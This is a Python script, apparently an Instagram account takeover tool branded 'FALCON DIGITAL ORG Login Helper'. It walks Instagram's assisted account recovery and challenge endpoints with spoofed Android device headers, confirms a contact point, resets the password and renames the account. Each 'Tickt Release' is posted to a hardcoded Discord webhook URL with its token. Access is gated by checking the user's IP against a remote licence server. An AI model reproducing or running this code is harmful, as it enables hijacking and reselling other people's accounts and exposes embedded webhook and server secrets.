import requests, uuid, random, re, ctypes, json, urllib, hashlib, hmac, urllib.parse, base64, os, string, threading
from time import sleep
import time

timestamp = str(int(time.time()))

uu = '83f2000a-4b95-4811-bc8d-0f3539ef07cf'
def RandomStringUpper(n=10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))


def RandomString(n=10):
    letters = string.ascii_lowercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))


def RandomStringUpper(n=10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))


def RandomStringChars(n=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(n))


def randomStringWithChar(stringLength=10):
    letters = string.ascii_lowercase + '1234567890'
    result = ''.join(random.choice(letters) for i in range(stringLength - 1))
    return RandomStringChars(1) + result

Banner = """                                                                
            ____________    __ -+-  ____________ 
            \_____     /   /_ \ |   \     _____/
             \_____    \____/  \____/    _____/
              \_____                    _____/
                \___________  ___________/
                          /____\ 

                        FALCON DIGITAL ORG 

                            IG : [@31421 - @m1c1 - @Exploit305]
                            Login Helper
"""

print(f"\t{Banner}")
print("--" * 40)


REQ = requests.session()




def writesomething(mark, text):
    print(f"\r[{mark}] {text} ", end='')




clearConsle = lambda: os.system('cls')


class sessting:
    def __init__(self):
        pass

    def headers_login(self):
        headers = {}
        headers['User-Agent'] = self.UserAgent
        headers['Host'] = 'i.instagram.com'
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['accept-encoding'] = 'gzip, deflate'
        headers['x-fb-http-engine'] = 'Liger'
        headers['Connection'] = 'close'
        return headers

    def generateUSER_AGENT(self):
        Devices_menu = ['HUAWEI', 'Xiaomi', 'samsung', 'OnePlus']
        DPIs = [
            '480', '320', '640', '515', '120', '160', '240', '800'
        ]
        randResolution = random.randrange(2, 9) * 180
        lowerResolution = randResolution - 180
        DEVICE_SETTINTS = {
            'system': "Android",
            'Host': "Instagram",
            'manufacturer': f'{random.choice(Devices_menu)}',
            'model': f'{random.choice(Devices_menu)}-{randomStringWithChar(4).upper()}',
            'android_version': random.randint(18, 25),
            'android_release': f'{random.randint(1, 7)}.{random.randint(0, 7)}',
            "cpu": f"{RandomStringChars(2)}{random.randrange(1000, 9999)}",
            'resolution': f'{randResolution}x{lowerResolution}',
            'randomL': f"{RandomString(6)}",
            'dpi': f"{random.choice(DPIs)}"
        }
        return '{Host} 155.0.0.37.107 {system} ({android_version}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {cpu}; {randomL}; en_US)'.format(
            **DEVICE_SETTINTS)

    def generate_DeviceId(self, ID):
        volatile_ID = "12345"
        m = hashlib.md5()
        m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]


class login:
    def __init__(self):
        self.sesstings = sessting()
        self.USER_AGENT = self.sesstings.generateUSER_AGENT()
        # self.username = None
        self.coo = None
        self.token = None
        self.mid = None
        self.DeviceID = None
        self.sessionid = None

    def headers_login(self):
        headers = {}
        headers['User-Agent'] = f"{self.USER_AGENT}"
        headers["Accept"] = "*/*"
        headers["Accept-Encoding"] = "gzip, deflate"
        headers["Accept-Language"] = "en-US"
        headers["X-IG-Capabilities"] = "3brTvw=="
        headers["X-IG-Connection-Type"] = "WIFI"
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['Host'] = 'i.instagram.com'
        return headers

    def checkpoint(self, user):
        info = requests.get(f"https://i.instagram.com/api/v1{self.req.json()['challenge']['api_path']}",
                            headers=self.headers_login(), cookies=self.coo)
        step_data = info.json()["step_data"]
        if "phone_number" in step_data:
            try:
                phone = info.json()["step_data"]["phone_number"]
                print(f'[0] phone_number : {phone}')
            except:
                pass
        elif "email" in step_data:
            try:
                email = info.json()["step_data"]["email"]
                print(f'[1] email : {email}')
            except:
                pass

        else:
            print("[-] unknown verification method [-]")
            input()
            exit()
        return self.send_choice(user)

    def send_choice(self, user):
        choice = input('choice : ')
        data = {}
        data['choice'] = str(choice)
        data['_uuid'] = uu
        data['_uid'] = uu
        data['_csrftoken'] = 'massing'
        challnge = self.req.json()['challenge']['api_path']
        self.send = requests.post(f"https://i.instagram.com/api/v1{challnge}", headers=self.headers_login(), data=data,
                                  cookies=self.coo)
        contact_point = self.send.json()["step_data"]["contact_point"]
        print(f'[+] code sent to : {contact_point} [+]')
        return self.get_code(user)

    def get_code(self, user):
        try:
            code = input("code : ")
            data = {}
            data['security_code'] = str(code),
            data['_uuid'] = uu,
            data['_uid'] = uu,
            data['_csrftoken'] = 'massing'
            path = self.req.json()['challenge']['api_path']
            send_code = requests.post(f"https://i.instagram.com/api/v1{path}", headers=self.headers_login(), data=data,
                                      cookies=self.coo)
            if "logged_in_user" in send_code.text:
                print(f'[+] Login Successfully as @{user} [+]')
                self.coo = self.req.cookies
                self.token = self.coo.get("csrftoken")
                self.mid = self.coo.get("mid")
                self.sessionid = self.coo.get("sessionid")
                sleep(3)

            else:
                regx_error = re.search(r'"message":"(.*?)",', send_code).group(1)
                print(regx_error)
                ask = input("[-] Code is Not Work Do You Want Try Agin [Y/N] : [-]")
                if ask.lower() == "y":
                    sleep(1)
                    return self.get_code(user)
                else:
                    exit()
        except:
            print("[+] accepted Done [+]")
            return self.Login(user)

    def Login(self, user):
        print(f"[+] UserName : {user} ")
        self.DeviceID = self.sesstings.generate_DeviceId(user)
        self.passwordd = input(f'[?] Password? : ')
        data = {}
        data['uuid'] = uu
        data['enc_password'] = f"#PWD_INSTAGRAM:0:{timestamp}:{self.passwordd}"
        data['username'] = user
        data['device_id'] = self.DeviceID
        data["from_reg"] = "false"
        data["_csrftoken"] = "missing"
        data['login_attempt_count'] = '0'
        self.req = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=self.headers_login(),data=data)
        if "logged_in_user" in self.req.text:
            print(f'[+] Login Successfully as @{user} [+]')
            self.coo = self.req.cookies
            sleep(4)
        elif 'checkpoint_challenge_required' in self.req.text:
            self.coo = self.req.cookies
            self.token = self.coo.get("csrftoken")
            self.mid = self.coo.get("mid")
            self.sessionid = self.coo.get("sessionid")
            print("[+] SCURE FOUND [+] ")
            return self.checkpoint(user)
        else:
            try:
                regx_error = re.search(r'"message":"(.*?)",', self.req.text).group(1)
                print("[!] ",regx_error)
            except:
                print(self.req.text)
            ask = input("[-] Something has gone wrong Do You Want Try Agin [Y/N] : [-]")
            if ask.lower() == "y":
                sleep(1)
                os.system("cls")
                return self.Login(user)
            else:
                input()
                exit()


class tickt_realise:
    def __init__(self):
        self.sessting = sessting()
        self.login = login()
        self.coo = None
        self.token = None
        self.mid = None
        self.DeviceID = None
        self.sessionid = None
        self.email = None
        self.phone = None
        self.req1 = None
        self.confirm_mode_email = None
        self.username = None
        self.confirm_mode_phone = None

    def drives(self):
        print("\t\t        Script Login in my github @Rayan1198 ")
        self.ask = int(input("[1] => Normal Login |  [2]^ => Login with Script in phone : "))
        if self.ask == 1:
            if self.username == None:
                self.username = input("[+] UserName? : ")
            self.login.Login(self.username)

        else:
            if self.username == None:
                self.username = input("[+] UserName? : ")
            # self.username = input("[?] UserName? : ")
            self.DeviceID = self.sessting.generate_DeviceId(self.username)
        return self.Account_recovery()

    def headers(self):
        self.head = {}
        self.head["Host"] = "i.instagram.com"
        self.head["User-Agent"] = 'Instagram 166.0.0.32.120 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)'
        self.head["Accept-Language"] = "en-US"
        self.head["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        self.head["Connection"] = "keep-alive"
        self.head['X-Ig-App-Locale'] = 'en_US'
        self.head['X-Ig-Device-Locale'] = "en_US"
        self.head["X-Pigeon-Rawclienttime"] = "1619296670.654"
        self.head["X-Ig-Bandwidth-Speed-Kbps"] = "-1.000"
        self.head["X-Ig-Bandwidth-Totalbytes-B"] = "0"
        self.head["X-Ig-Bandwidth-Totaltime-Ms"] = "0"
        self.head["X-Ig-App-Startup-Country"] = "unknown"
        self.head["X-Bloks-Version-Id"] = "befa8522d3a650f9592e33e4540d527c5b93babbdd6233a1bd40e955c9567f30"
        self.head["X-Ig-Www-Claim"] = "0"
        self.head["X-Bloks-Is-Layout-Rtl"] = "false"
        self.head["X-Bloks-Is-Panorama-Enabled"] = "true"
        self.head["X-Mid"] = "YMXJVQABAAGa6Frp6LAbn3r6iCWR"
        return self.head

    def Account_recovery(self):
        data = {}
        data["source"] = "login_help"
        data["_csrftoken"] = ""
        data["guid"] = str(uu)
        data["device_id"] = str(self.DeviceID)
        data["query"] = self.username
        sleep(1)
        Accountt = requests.post("https://i.instagram.com/api/v1/accounts/assisted_account_recovery/", data=data,headers=self.headers())
        Account = Accountt.text
        b = Accountt.json()
        if "show_recovery_challenge" in Account:
            self.path = re.search(r'"uri":"(.*?)",', Accountt.text).group(1)
            self.jsondata = b["challenge_context"]
            # print(self.jsondata)
            return self.print_info()
        else:
            print(f"[-] Error for open tickt , {Account}")
            input()
    def path_Request(self):
        return requests.get(f'https://i.instagram.com/api/v1{self.path}', headers=self.headers())

    def print_info(self):
        self.req = self.path_Request()
        try:
            pp = self.req.json()["step_data"]["options"][0]
            self.contact_point = pp["contact_point"]
            self.cho = pp["choice"]
            print(f'[{self.cho}] {self.contact_point}')
        except:
            pass
        try:
            pp = self.req.json()["step_data"]["options"][1]
            self.contact_point = pp["contact_point"]
            self.cho = pp["choice"]
            print(f'[{self.cho}] {self.contact_point}')
        except:
            pass
        try:
            pp = self.req.json()["step_data"]["options"][2]
            self.contact_point = pp["contact_point"]
            self.cho = pp["choice"]
            print(f'[{self.cho}] {self.contact_point}')
        except:
            pass
        return self.choice()

    def choice(self):
        choice = input("[?] Choice : ")
        data = {}
        data["choice"] = choice
        data["_csrftoken"] = ""
        data["is_bloks_web"] = 'False'
        data["bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}'
        data["nest_data_manifest"] = 'true'
        data["challenge_context"] = f"{self.jsondata}"
        data["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        sleep(1.5)
        req = requests.post("https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/", data=data,headers=self.headers()).text
        if req.__contains__("It may take up to a minute for you to receive this code"):
            self.req1 = self.path_Request()
            # print(self.req1.json())
            print(f"[+] Code Sent To {self.req1.json()['step_data']['contact_point']} [+] ")
            return self.put_code()
        else:
            print("[-] Error [-]")
            input()
            exit()

    def send(self,user):
  # webhook url, from here: https://i.imgur.com/f9XnAew.png

        # for all params, see https://discordapp.com/developers/docs/resources/webhook#execute-webhook
        data = {}
        # leave this out if you dont want an embed
        # for all params, see https://discordapp.com/developers/docs/resources/channel#embed-object
        data["embeds"] = [
            {
                "description": f"**[@{self.username}](https://instagram.com/{self.username}) Changed To [@{user}](https://instagram.com/{user})**\nChanged By {by}",
                "title": f"Tickt Release",

            }
        ]
        result = requests.post("https://discord.com/api/webhooks/927625738566369372/OlmsFpybTFYbfQdJmKSz-PL59DvbHSKrKTUJKGiM_kgTkKP9oMkHkZetmChFxouYsd9m", json=data)
        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            pass

    def put_code(self):
        self.code = input("[?] Code : ")
        data = {}
        data["security_code"] = self.code
        data["_csrftoken"] = ""
        data["is_bloks_web"] = "False"
        data["bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}'
        data["nest_data_manifest"] = "true"
        data["challenge_context"] = f"{self.jsondata}"
        data["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        request_code = requests.post(
            "https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/", data=data,
            headers=self.headers()).text
        if request_code.__contains__("user_id"):
            print("[+] Code Is True [+] ")
            return self.informations()
        elif request_code.__contains__("Please check the code we sent you and try again"):
            print(" [-] Please check the code we sent you and try again. [-] ")
            ask = input("[?] Do You Want try Agin [Y/N] : ")
            if ask.lower() == "y":
                sleep(1)
                return self.put_code()
            else:
                input()
                exit()
        else:
            print(f"[-] Error send_code [-]")
            input()
            exit()

    def informations(self):
        info = self.path_Request()
        try:
            self.email = info.json()["step_data"]["contact_point"]
        except:
            print("Nothing Info")
            input()
            exit()
        try:
            self.confirm_mode_email = input(f"[?] Confirm Email -> {self.email} [Y/N] : ")
        except:
            self.confirm_mode_email = input(f"[?] Confirm New Email [Y/N] : ")
        return self.confirm()

    def confirmed(self, contact, types):
        data = {}
        data["_csrftoken"] = ""
        data["is_bloks_web"] = 'False'
        data["skip"] = '0'
        data["type"] = types
        data["contact_point"] = f'{contact}'
        data["bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}',
        data["nest_data_manifest"] = 'true',
        data["challenge_context"] = f"{self.jsondata}",
        data["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        sleep(1.5)
        Response = requests.post(
            "https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/", data=data,
            headers=self.headers()).text
        if Response.__contains__("Add New Phone Number") or Response.__contains__(
                "Confirm Your Phone Number") or Response.__contains__(
                "Confirm Your Phone Number") or Response.__contains__("pwd_change_after_phone_after_email"):
            print(f"[+] {contact} Confirmed [+] ")
        elif Response.__contains__("Another account is using"):
            print("[-] Error confirmed Because Another account is using email or phone_number [-]")
            ask = input("[?] Try agin? [Y/n] : ")
            if ask.lower() == "y":
                return self.choice()
            else:
                input("[\] press Enter To close tickt ");
                exit(0)
        elif Response.__contains__("It may take up to a minute for you to receive this code"):
            return self.put_code()
        else:
            print("[-] Error confirmed [-]")
            input()
            exit(0)

    def skip(self, contact):
        data = {}
        data["_csrftoken"] = ""
        data["is_bloks_web"] = 'False'
        data["skip"] = '1'
        data["contact_point"] = ''
        data["bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}'
        data["nest_data_manifest"] = 'true'
        data["challenge_context"] = f"{self.jsondata}",
        data["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        sleep(1.5)
        Response = requests.post("https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/", data=data,headers=self.headers()).text
        if Response.__contains__("Add New Phone Number") or Response.__contains__(
                "Confirm Your Phone Number") or Response.__contains__("Change Your Password") or Response.__contains__(
                "pwd_change_after_phone_after_email"):
            print(f"[+] {contact} [+]")
        else:
            print(f"[-] Something has gone wrong [-]")
            input()
            exit()

    def confirm(self):
        if self.confirm_mode_email.lower() == 'y':
            self.type = "email"
            self.confirmed(self.email, self.type)
            self.skip("phone_number Skipped")
            self.change_password()
        elif self.confirm_mode_email.lower() == 'n':
            self.type = "phone_number"
            self.skip("email Skipped")
            infos = self.path_Request()
            self.phone = infos.json()["step_data"]["contact_point"]
            self.confirmed(self.phone, self.type)
            self.change_password()
        else:
            print(f"[-] nothing choice [-]")
            input()
            exit()

    def change_password_email(self):
        ask = input("[?] Do You Want Random password [Y/N] : ")
        if ask.lower() == "y":
            self.new_password = RandomString(15)
            print(f"[+] Password is -> {self.new_password} [+]")
        else:
            self.new_password = input("[*] New Password : ")
        data_password = {}
        data_password["_csrftoken"] = ""
        data_password["is_bloks_web"] = 'False'
        data_password[
            "bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}'
        data_password["nest_data_manifest"] = 'true'
        data_password["challenge_context"] = f"{self.jsondata}"
        data_password["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        data_password["enc_new_password1"] = f"#PWD_INSTAGRAM:4:{timestamp}:{self.new_password}"
        data_password["enc_new_password2"] = f"#PWD_INSTAGRAM:4:{timestamp}:{self.new_password}"
        sleep(1)
        Respone = requests.post(
            "https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/",
            data=data_password, headers=self.headers()).text
        if Respone.__contains__(self.username):
            print("[+] Password Changed [+]")
            return self.changeUsername()
        elif Respone.__contains__("Create a password at least 6 characters long"):
            print("[-] Create a password at least 6 characters long. [-]")
            input()
            exit()
        else:
            print(f"[-] Error_Change_password [-]")
            input()
            exit()

    def change_password(self):
        ask = input("[?] Do You Want Random password [Y/N] : ")
        if ask.lower() == "y":
            self.new_password = RandomString(15)
        else:
            self.new_password = input("[*] New Password : ")
        data_password = {}
        data_password["_csrftoken"] = ""
        data_password["is_bloks_web"] = 'False'
        data_password["bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}'
        data_password["nest_data_manifest"] = 'true'
        data_password["challenge_context"] = f"{self.jsondata}"
        data_password["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        data_password["enc_new_password1"] = f"#PWD_INSTAGRAM:0:{timestamp}:{self.new_password}"
        data_password["enc_new_password2"] = f"#PWD_INSTAGRAM:0:{timestamp}:{self.new_password}"
        sleep(1)
        Respone = requests.post(
            "https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/",
            data=data_password, headers=self.headers()).text
        if Respone.__contains__(self.username):
            print("[+] Password Changed [+]")
            return self.changeUsername()

        elif Respone.__contains__("Create a password at least 6 characters long"):
            print("[-] Create a password at least 6 characters long. [-]")
            input()
            exit()
        else:
            print(f"[-] Error_Change_password [-]")
            input()
            exit()

    def changeUsername(self):
        ask = input("[?] Do You Want Random Username [Y/N] : ")
        if ask.lower() == "y":
            new_username = self.username + ".done_changeusername"
        else:
            new_username = input(f"[?] New Username : ")
        data = {}
        data["external_url"] = ''
        data["_csrftoken"] = f""
        data['username'] = str(new_username)
        data["is_bloks_web"] = 'False'
        data["first_name"] = ''
        data["biography"] = 'FALCON DIGITAL ORG\n IG : [@31421 - @m1c1 - @Exploit305]\nLogin Helper'
        data["bk_client_context"] = '{"bloks_version":"e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931","styles_id":"instagram"}'
        data["nest_data_manifest"] = 'true'
        data["challenge_context"] = f"{self.jsondata}"
        data["bloks_versioning_id"] = 'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931'
        ctypes.windll.user32.MessageBoxW(0, "TICKT REALISE IS READY ?  ", f"FALCON DIGITAL 🦅", 0x1000)
        change_username = requests.post("https://instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/", data=data,headers=self.headers()).text
        if change_username.__contains__(new_username) or change_username.__contains__('"status":"ok"'):
            print(f"[+] Username Changed To -> {new_username} [+] ")
            self.send(new_username)
            input()
            try:
                with open(f"@{new_username}.txt", "a") as Save:
                    Save.write(
                        f"old username : @{self.username}\nnew Username : @{new_username}\nnew_password : {self.new_password}")
            except:
                pass
        else:
            print(f"\n[-] Something has gone wrong [-] ")
            with open(f"@{new_username}.txt", "a") as Save:
                Save.write(
                    f"old username : @{self.username}\nnew Username : @{new_username}\nnew_password : {self.new_password}")





if __name__ == '__main__':
    active = requests.get("https://api.ipify.org/?format=json").json()
    ip = active["ip"]
    scan = requests.get('http://165.227.96.37:3000/hottest_Xpmo',headers={"secret":'d030e03651ea94264800ce5911f2f4f5'}).text
    if ip in scan:
        by = re.search(rf'{ip}  "(.*?)"', scan).group(1)
        print(f"[+] Welcme Mr.{by} To Login Helper [+]")
        tickt = tickt_realise()
        tickt.drives()
    else:
        print(f"[-] This ip {ip} is not active [-] ")
        input()
        exit(0)

